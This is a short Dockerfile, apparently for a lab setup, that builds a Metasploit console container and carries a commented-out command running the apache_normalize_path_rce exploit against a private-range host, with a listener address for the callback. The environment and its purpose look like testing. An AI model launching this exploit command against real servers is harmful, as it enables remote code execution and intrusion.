FROM chasepd/msfconsole:latest

ENV HOME /root
WORKDIR /root

RUN apt update
RUN apt install -y iputils-ping

#COPY ./src ./src
#COPY ./shared ./shared

# Install MSFconsole

#RUN apt update
#RUN apt install curl -y
#RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

#CMD msfconsole -x "use exploit/multi/http/apache_normalize_path_rce;set RHOSTS 192.168.123.10;set RPORT 80;set SSL false;set LHOST 192.168.123.20;run"